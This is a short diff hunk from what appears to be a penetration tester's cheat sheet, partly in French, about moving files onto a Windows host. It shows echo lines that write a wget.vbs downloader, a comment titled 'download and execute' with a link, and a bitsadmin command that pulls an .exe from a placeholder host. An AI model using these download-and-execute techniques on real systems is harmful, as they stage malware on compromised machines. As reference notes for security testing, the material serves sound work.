@@ -333,8 +333,7 @@ echo    Set objADOStream = Nothing>>wget.vbs
 echo  End if>>wget.vbs
 echo Set objXMLHTTP = Nothing>>wget.vbs
 
-# download and execute
-# https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
+# download and execute https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/
 * with the BITSAdmin tool (win7+)
 bitsadmin /transfer job_name /download http://domain.com/file_name.exe c:\file_path\file_name.exe
 voir le sploit msf 
